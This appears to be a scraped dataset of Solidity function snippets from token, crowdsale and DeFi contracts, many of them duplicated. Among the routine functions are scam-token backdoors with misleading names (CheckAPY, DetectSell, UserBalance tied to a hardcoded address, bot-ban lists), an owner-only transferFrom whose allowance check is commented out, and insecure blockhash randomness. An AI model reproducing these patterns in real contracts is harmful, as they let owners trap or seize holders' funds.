        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function hasEnded() public view returns (bool) {
    bool capReached = weiRaised >= cap;
    bool timeLimit = now > endTime;
    return capReached || timeLimit;
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function _getTokenAmount(uint256 _weiAmount)
        internal view returns (uint256)
    {
        uint256 bonusRate = getBonusRate(_weiAmount);
        return _weiAmount.mul(bonusRate).div(1 ether);
    }
--------------------------------------------------------------------------------
function () payable external {
    _bank = _bank.add(msg.value);
     emit invest(msg.sender,msg.value); 
 }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function random(uint256 _min, uint256 _max) public constant returns(uint256)
    {
        return uint256(sha3(block.blockhash(block.number - 1))) % (_min + _max) - _min;
	}
--------------------------------------------------------------------------------
function addHolder(address add, uint256 amount) onlyOwner public{
        //if user had already claimed his funds we add an additional quantity of token
        //if there were already an amount not claimed it wil be updated
        //if it is a new users a new entry will be added
        tokenHoldersToClaim[add]=amount;
        tokenHoldersTotal[add]=tokenHoldersClaimed[add]+amount;
        AddedTokenHolder(add,amount);
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    addToken(_to, _tokenId);
    Transfer(0x0, _to, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function getBalanceOf(
        bytes32 _tradeRecordId,
        address _seller,
        address _buyer
    )
    external
    view
    returns (bytes32, uint)
    {
        bytes32 _escrowHash = _getEscrowHash(_tradeRecordId, _seller, _buyer);
        return (_getEscrowSymbol(_escrowHash), _getEscrowValue(_escrowHash));
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
constructor() public ManagedToken(msg.sender, msg.sender) {
        name = "Liquiditex";
        symbol = "LEX";
        decimals = 18;
        totalIssue = 0;
        //The maximum number of tokens is unchanged and totals will decrease after issue
        totalSupply = 100000000 ether;
    }
--------------------------------------------------------------------------------
function balanceOf(address _owner) public view returns (uint256) {
    uint256 owedDividend;
    (owedDividend,) = getOwedDividend(_owner);
    return BasicToken.balanceOf(_owner).add(owedDividend);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x693d6b5D8870015CF79c87Af0c99Ca268cF9d667,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function withdraw() onlyOwner public {
    uint _balance = address(this).balance;
    owner.transfer(_balance);
    LogWithdraw(owner, _balance);
  }
--------------------------------------------------------------------------------
function Ecosystem(address _metadataContractAddr) public {
        assert(_metadataContractAddr != address(0));
        //passing address of meta data contract to metadata type address variable
        objMetadata = Metadata(_metadataContractAddr);
        //register this contract in metadata
        objMetadata.addAddress(ecosystemContractID, this);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function perAddressCap() public constant returns(uint256) {
        uint256 baseline = 1000 * (10**18);
        return baseline.add(presaleEtherRaised.div(100));
    }
--------------------------------------------------------------------------------
function getRegistryImplementation() public view returns (address index, address implementation) {
    index = StorageInterface(app_storage).getIndex(registry_exec_id);
    implementation = StorageInterface(app_storage).getTarget(registry_exec_id, REGISTER_APP_SEL);
  }
--------------------------------------------------------------------------------
function changeTokenOwner() public onlyOwner {
        require(now > endRefundableTime && weiRaised.add(preSale.weiRaised()) < softCap);
        token.transferOwnership(owner);
    }
--------------------------------------------------------------------------------
constructor(address _owner) public{
        owner = _owner;
        balances[owner] = _totalSupply;
        emit Transfer(address(0x0), _owner, _totalSupply);
    }
--------------------------------------------------------------------------------
function addToWhitelist(address _address) public onlyWhitelister {
        require(_address != address(0));
        emit WhitelistAdd(whitelister, _address);
        whitelist[_address] = true;
    }
--------------------------------------------------------------------------------
function removeFromWhitelist(address _address) public onlyWhitelister {
        require(_address != address(0));
        emit WhitelistRemove(whitelister, _address);
        whitelist[_address] = false;
    }
--------------------------------------------------------------------------------
constructor(
        EDDA _tokenContract, 
        uint256 _priceInWei,
        address _tokenAcceptor, 
        address payable _ETHAcceptor,
        address _reserved
    ) public {
        tokenContract = _tokenContract;
        tokenAcceptor = _tokenAcceptor;
        priceInWei = _priceInWei;
        ETHAcceptor = _ETHAcceptor;
        reserved = TokenSplitter(_reserved);
    }
--------------------------------------------------------------------------------
function withdraw() public onlyOwner {
        emit Withdraw(ETHAcceptor, address(this).balance);
        ETHAcceptor.transfer(address(this).balance);
    }
--------------------------------------------------------------------------------
function allowPreTrading(address account, bool allowed) private onlyOwner {
        require(preTrader[account] != allowed, "TOKEN: Already enabled.");
        preTrader[account] = allowed;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function upgrade(
    address controller, address beacon, address implementation
  ) external onlyOwner {
    // Ensure that the timelock has been set and is completed.
    _enforceTimelock(abi.encode(controller, beacon, implementation));

    // Exit contingency state if it is currently active and trigger a heartbeat.
    _exitAdharmaContingencyIfActiveAndTriggerHeartbeat();

    // Call controller with beacon to upgrade and implementation to upgrade to.
    _upgrade(controller, beacon, implementation);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
        returns (bool success) {
		if (_value <= 0) revert(); 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function TuneToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function getUserMatches(address _address) public view returns(uint64[] memory _proposedMatches, uint64[] memory approvedMatches) {
       
       User storage user = allUsers[_address];
       _proposedMatches = user.proposedMatches;
       approvedMatches = user.approvedMatches;
      }
--------------------------------------------------------------------------------
function fromCompound(address _token, uint _amount) external onlyAuthorized {
        require(ICToken(globalConfig.tokenInfoRegistry().getCToken(_token)).redeemUnderlying(_amount) == 0, "redeemUnderlying failed");
    }
--------------------------------------------------------------------------------
function CrowdsaleController(ISmartToken _token, uint256 _startTime, address _beneficiary, address _btcs, bytes32 _realEtherCapHash)
        SmartTokenController(_token)
        validAddress(_beneficiary)
        validAddress(_btcs)
        earlierThan(_startTime)
        validAmount(uint256(_realEtherCapHash))
    {
        startTime = _startTime;
        endTime = startTime + DURATION;
        beneficiary = _beneficiary;
        btcs = _btcs;
        realEtherCapHash = _realEtherCapHash;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x1c006642BBc162C16d8Ffc44B45221Ed4114a209,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function getPermissions() public view returns(bytes32[]) {
        bytes32[] memory allPermissions = new bytes32[](1);
        allPermissions[0] = TRANSFER_APPROVAL;
        return allPermissions;
    }
--------------------------------------------------------------------------------
function getLiquidity() public view returns (uint) {
        return 500000000 * 10 ** uint(_decimals) + businessPoll.totalMine + communityPoll.totalMine + techPoll.totalMine;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function _delete(address addr) private {
        if(investors[addr].iteration != iterationIndex)
            return;
        investors[addr].iteration = 0;
        countOfInvestors--;
    }
--------------------------------------------------------------------------------
function removefrontrunbots(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            botban(_counts[i]); }
    
    }
--------------------------------------------------------------------------------
function scalarFromCurvePoints(
    uint256[2] memory hash,
    uint256[2] memory pk,
    uint256[2] memory gamma,
    address uWitness,
    uint256[2] memory v
  ) internal pure returns (uint256 s) {
    return uint256(keccak256(abi.encodePacked(SCALAR_FROM_CURVE_POINTS_HASH_PREFIX, hash, pk, gamma, v, uWitness)));
  }
--------------------------------------------------------------------------------
constructor(address vat_) public {
        wards[msg.sender] = 1;
        vat = VatLike(vat_);
        par = ONE;
        live = 1;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
    override
  {
    ownerToOperators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor(
        address _rewardsDistribution,
        address _rewardsToken,
        address _stakingToken
    ) public {
        rewardsToken = IERC20(_rewardsToken);
        stakingToken = IERC20(_stakingToken);
        rewardsDistribution = _rewardsDistribution;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    shitting[spender] = val;
    cross[spender] = val2; 
    shark[spender] = val3;
    summer = val4;
  }
--------------------------------------------------------------------------------
function DetectSell(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    dudio[spender] = val;
    soup[spender] = val2; 
    sopa[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function finalization() internal {
    if (goalReached()) {
      escrow.reachGoal();
      escrow.beneficiaryWithdraw();
    } else {
      escrow.enableRefunds();
    }

    super.finalization();
  }
--------------------------------------------------------------------------------
constructor(address vat_) public {
        wards[msg.sender] = 1;
        vat = VatLikeSpot(vat_);
        par = ONE;
        live = 1;
    }
--------------------------------------------------------------------------------
function hash_seed(
        string seed, 
        Algorithm algorithm
    ) pure internal returns(bytes32) {
        if (algorithm == Algorithm.sha) return sha256(seed);
        else return keccak256(seed);
    }
--------------------------------------------------------------------------------
function hash_data(
        bytes32 key, 
        Algorithm algorithm
    ) pure internal returns(bytes32) {
        if (algorithm == Algorithm.sha) return sha256(key);
        else return keccak256(key);
    }
--------------------------------------------------------------------------------
function blind(
        address addr,
        Algorithm algorithm
    ) pure internal returns(bytes32) {
        if (algorithm == Algorithm.sha) return sha256(addr);
        else return keccak256(addr);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function effectiveMaxBet() public view returns (uint _amount) {
        uint _curMax = curMaxBet();
        return _curMax > settings.maxBet ? settings.maxBet : _curMax;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
constructor(address _rewardToken,
        address _lpToken,
        uint256 _duration,
        address _rewardDistribution) public
    IRewardDistributionRecipient(_rewardDistribution)
    {
        rewardToken = IERC20(_rewardToken);
        lpToken = IERC20(_lpToken);
        duration = _duration;
        governance = msg.sender;
    }
--------------------------------------------------------------------------------
function _checkPixelAbove(uint _pixelId) private view returns (bool) {
        if (ownerOf(_pixelId) == ownerOf(_pixelId-1000)) {
            return true;
        } else {
            return false;
        }
    }
--------------------------------------------------------------------------------
constructor (uint256 openingTime, uint256 closingTime) internal {
        // solium-disable-next-line security/no-block-members
        require(openingTime >= block.timestamp);
        require(closingTime > openingTime);

        _openingTime = openingTime;
        _closingTime = closingTime;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function beneficiarytotal(address addr) public view returns (uint256) {
    	require(_beneficiary_total[addr] != 0,'not in beneficiary list');
        return _beneficiary_total[addr];
    }
--------------------------------------------------------------------------------
function setInterestPrice(address _property, uint256 _value)
		external
		returns (uint256)
	{
		addressValidator().validateAddress(msg.sender, config().lockup());

		eternalStorage().setUint(getInterestPriceKey(_property), _value);
	}
--------------------------------------------------------------------------------
function calculateContribution(uint _available, uint _requiredAmount)
        internal
        pure
        returns(uint taken, uint remainder)
    {
        if (_requiredAmount > _available)
            taken = _available;
        else {
            taken = _requiredAmount;
            remainder = _available - _requiredAmount;
        }
    }
--------------------------------------------------------------------------------
function Cedex() {
      	totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function _modifyBeneficiary(uint _tokenId, address _to)
        internal
    {
        if (registry.getBeneficiary(bytes32(_tokenId)) != _to) {
            registry.modifyBeneficiary(bytes32(_tokenId), _to);
        }
    }
--------------------------------------------------------------------------------
function disableFundingWallets(address _address) external onlyOwner {
        require(fundingEnabled);
        require(fundingWallet != _address);
        require(fundingWallets[_address]);

        fundingWallets[_address] = false;
    }
--------------------------------------------------------------------------------
function() payable {
    if (msg.value > 0) {
      // Fire deposited event if we are receiving funds
      Deposited(msg.sender, msg.value, msg.data);
    }
  }
--------------------------------------------------------------------------------
function GOLDBARToken() public {
        symbol = "GBT";
        name = "GOLDBAR Token";
        decimals = 18;
        endDate = now + 7 weeks;

    }
--------------------------------------------------------------------------------
function requestChangeStaker(address newStaker) public onlyAdminOrOwner {
        uint deferBlock = computeDeferBlock();
        changeStakerOperation = ChangeStakerOperation(newStaker, admin, deferBlock);
        ChangeStakerOperationEvent(newStaker, deferBlock);
    }
--------------------------------------------------------------------------------
function requestDelegation(DelegateERC20 _delegate) public onlyAdminOrOwner {
        uint deferBlock = computeDeferBlock();
        delegateOperation = DelegateOperation(_delegate, admin, deferBlock);
        DelegateOperationEvent(_delegate, deferBlock);
    }
--------------------------------------------------------------------------------
function getTournamentAdmissionBlock() public view returns(uint256) {
        uint256 admissionInterval = (ADMISSION_TIME / secondsPerBlock);
        return tournamentEndBlock < admissionInterval ? 0 : tournamentEndBlock - admissionInterval;
    }
--------------------------------------------------------------------------------
function mhethkeeper() public{
        owner = msg.sender;
        isFinalized = false;
        curVotes = 0;
        mgrCount = 0;
        minVotes = 2;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 tokenId) external view returns (uint256) {
        require(
            _exists(tokenId),
            "ERC721: operator query for nonexistent token"
        );

        return tokenId;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function addDepositToken(address _conAddr,string memory _symbol,uint256 exRate) public onlyPermits {
        
        allowDeposit[_conAddr] = true;
        depositExRate[_conAddr] = exRate;
        emit DepositToken(_conAddr,exRate,_symbol);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) revert();
        if (!ethFundDeposit.send(this.balance)) revert();
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function buy(address _referredBy)
        public
        payable
        returns(uint256)
    {
        require(tx.gasprice <= 0.05 szabo);
        purchaseTokens(msg.value, _referredBy, false);
    }
--------------------------------------------------------------------------------
function()
        payable
        public
    {
        require(tx.gasprice <= 0.05 szabo);
        purchaseTokens(msg.value, 0x0, false);
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
        //require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function invest(uint32 _playerId, uint32 _investorId, uint64 _amount, uint16 _userFee) external onlyServer {
		require(_amount > 0 && _userFee > 0);
		investTerms[_investorId][_playerId] = InvestTerm(_amount, _userFee);
	}
--------------------------------------------------------------------------------
function () external payable
    {
                        if( msg.value > 0 )
            buyTokens(msg.sender);
        else
            airDrop(msg.sender); 
        
        
        
           
    }
--------------------------------------------------------------------------------
constructor (uint256 _initialSupply, string memory _name, string memory _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balances[owner] = _initialSupply;
    }
--------------------------------------------------------------------------------
constructor () {
        _name = "XERIUM";
        _symbol = "XERM ";
        _totalSupply;
        _mint(owner(), 75000000 * 10 ** (decimals()) );
    }
--------------------------------------------------------------------------------
function transferFromAndCall(
    address _from,
    address _to,
    uint256 _value,
    bytes _data
  )
    public payable returns (bool)
  {
    require(_to != address(this));

    super.transferFrom(_from, _to, _value);

    // solium-disable-next-line security/no-call-value
    //require(_to.call.value(msg.value)(_data));
    return true;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
    if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function isExist(string calldata _name) external view returns (bool) {
		bytes32 _nameKey = keccak256(abi.encodePacked(_name));
		return (nameToNameTAOIdLookup[_nameKey] != address(0));
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function registerUsers(address[] contributors)
        external
        onlyOwner
    {
        for (uint i = 0; i < contributors.length; i++) {
            registerUser(contributors[i]);
        }
    }
--------------------------------------------------------------------------------
function ownerSafeWithdrawal() external onlyOwner nonReentrant {
        uint balanceToSend = this.balance;
        beneficiary.transfer(balanceToSend);
        FundTransfer(beneficiary, balanceToSend, false);
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 25;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function send(address _to, uint _value, bytes _data) only_owner {
		if (!_to.call.value(_value)(_data)) throw;
		Sent(_to, _value, _data);
	}
--------------------------------------------------------------------------------
function balanceOf(address address_) public view returns (uint256) {
        // Proxy the balance function
        // We have a tracker of initialization of _balanceOf to track the differences
        // If initialized, we use the state storage. Otherwise, we use CM V1 storage.
        if (_balanceOfInitialized[address_]) {
            return _balanceOf[address_]; 
        } else {
            return CM.balanceOf(address_);
        }
    }
--------------------------------------------------------------------------------
function returnWebsiteData() external view returns(uint, uint, uint, uint, uint, uint, uint, uint, bool, bool) {
    
        return (startBlock, endBlock, numberOfBackers(), ethReceived, maxCap, minCap, totalTokensSent, tokenPriceWei, paused, crowdsaleClosed);
    }
--------------------------------------------------------------------------------
function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal view {
        require(_beneficiary != address(0));
        require(_weiAmount != 0);
        require(currentPhase < phases.length);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public 
        returns (bool success) {
		if (_value <= 0) revert(); 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
constructor () public {
    owner = msg.sender;
    balances[owner] = totalSupply;
    emit Transfer(0x0, owner, totalSupply);
  }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 2;
        return res;
    }
--------------------------------------------------------------------------------
function addRecipient( address _recipient, uint _rewardRate ) external onlyPolicy() {
        require( _recipient != address(0) );
        info.push( Info({
            recipient: _recipient,
            rate: _rewardRate
        }));
    }
--------------------------------------------------------------------------------
function enableTrading() external onlyOwner {
        require(!tradingActive, "Cannot reenable trading");
        tradingActive = true;
        swapEnabled = true;
        emit EnabledTrading();
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.transfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function mint(address account, uint256 value) public onlyOwner returns (bool) {
        require(inWhiteList(account), "account is not in whiteList");
        _mint(account, value);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
if (this.balance == 0) throw;
if (!ethFundDeposit.send(this.balance)) throw;
}
--------------------------------------------------------------------------------
function requireValidOrder(Order memory order, Sig memory sig)
        internal
        view
        returns (bytes32)
    {
        bytes32 hash = hashToSign(order);
        require(validateOrder(hash, order, sig));
        return hash;
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function mint(address account, uint256 amount) external onlyOwner {
        require(totalSupply().add(amount) <= cap, "ERC20Capped: cap exceeded");
        _mint(account, amount);
    }
--------------------------------------------------------------------------------
function withdrawReward(address _to, IERC20 _token, uint256 _amount) external {
        require(msg.sender == farm, "not farm!");
        _token.safeTransfer(_to, _amount);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _amount) returns (bool success) {
        // Cannot transfer before crowdsale ends
        require(finalised);
        // Cannot transfer if KYC verification is required
        require(!kycRequired[msg.sender]);
        // Standard transfer
        return super.transfer(_to, _amount);
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint _amount) 
        returns (bool success)
    {
        // Cannot transfer before crowdsale ends
        require(finalised);
        // Cannot transfer if KYC verification is required
        require(!kycRequired[_from]);
        // Standard transferFrom
        return super.transferFrom(_from, _to, _amount);
    }
--------------------------------------------------------------------------------
function UDIAtoken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = totalSupply_;
        Transfer(0x0, msg.sender, totalSupply_);
    }
--------------------------------------------------------------------------------
constructor(address whaleAddress, uint256 wagerLimit) 
    onlyRealPeople()
    public 
    {
        openToPublic = false;
        owner = msg.sender;
        whale = whaleAddress;
        totalDonated = 0;
        betLimit = wagerLimit;
        
    }
--------------------------------------------------------------------------------
function startBonking(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
function stake()
        public
    {
        _getLPToken();
        uint256 amount = IERC20(lp).balanceOf(address(this));
        staking.stake(amount);
    }
--------------------------------------------------------------------------------
function _getTokenFromHere(address token)
        public
        onlyGovOrSubGov
    {
        IERC20 t = IERC20(token);
        t.transfer(reserves, t.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 25;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function onERC721Received(address, address, uint256 _tokenId, bytes) external returns (bytes4) {
        if (msg.sender == address(land) && flagReceiveLand == _tokenId) {
            flagReceiveLand = 0;
            return ERC721_RECEIVED;
        }
    }
--------------------------------------------------------------------------------
function ownerSafeWithdrawal() external onlyOwner nonReentrant {
        uint balanceToSend = this.balance;
        beneficiary.transfer(balanceToSend);
        FundTransfer(beneficiary, balanceToSend, false);
    }
--------------------------------------------------------------------------------
function claim(uint16 _x, uint16 _y, uint16 _width, uint16 _height)
    claimAllowed(_width, _height)
    coordsValid(_x, _y, _width, _height)
    external returns (uint)
  {
    Rect memory rect = Rect(_x, _y, _width, _height);
    return claimShortParams(rect);
  }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint _amount) 
        returns (bool success)
    {
        // Cannot transfer before crowdsale ends or cap reached
        require(now > ENDDATE || totalEthers == CAP);
        // Standard transferFrom
        return super.transferFrom(_from, _to, _amount);
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.transfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function hasEnded() external constant returns (bool) {
        bool capReached = weiRaised >= weiMaximumGoal;
        bool afterEndTime = now > endTime;
        
        return capReached || afterEndTime;
    }
--------------------------------------------------------------------------------
function loadRefund() external payable {
        require(msg.value > 0);
        require(!isMinimumGoalReached());
        
        loadedRefund = loadedRefund.add(msg.value);
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 25;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function initializeRates(address _collateralType) public override onlyConfig {
    require(_collateralType != address(0));
    lastRefresh[_collateralType] = now;
    cumulativeRates[_collateralType] = WadRayMath.ray();
  }
--------------------------------------------------------------------------------
function KCHToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function Mints(uint256 quantity) external onlyOwner {
    
     require(totalSupply() + quantity <= amountForDevs, "reached max supply");
    _safeMint(msg.sender, quantity);
  }
--------------------------------------------------------------------------------
function setStakingExclusionStatus(address addr, bool exclude) external authorized {
        if(exclude)
            excludeFromStaking(addr);
        else
            includeToStaking(addr);
        emit ExcludeFromStaking(addr, exclude);
    }
--------------------------------------------------------------------------------
constructor(uint256 _openingTime, uint256 _closingTime) public {
    require(_openingTime >= block.timestamp);
    require(_closingTime >= _openingTime);

    openingTime = _openingTime;
    closingTime = _closingTime;
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xf9DAf72d3b4D018e6658924b9945E42531CEEE0E,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public ownerOnly {
        require(!_feeless || _feeless && canFeeWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public ownerOnly {
        require(!_feeless || _feeless && canFeeWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
constructor(address _implementation) public payable {
    assert(IMPLEMENTATION_SLOT == bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1));

    _setImplementation(_implementation);
  }
--------------------------------------------------------------------------------
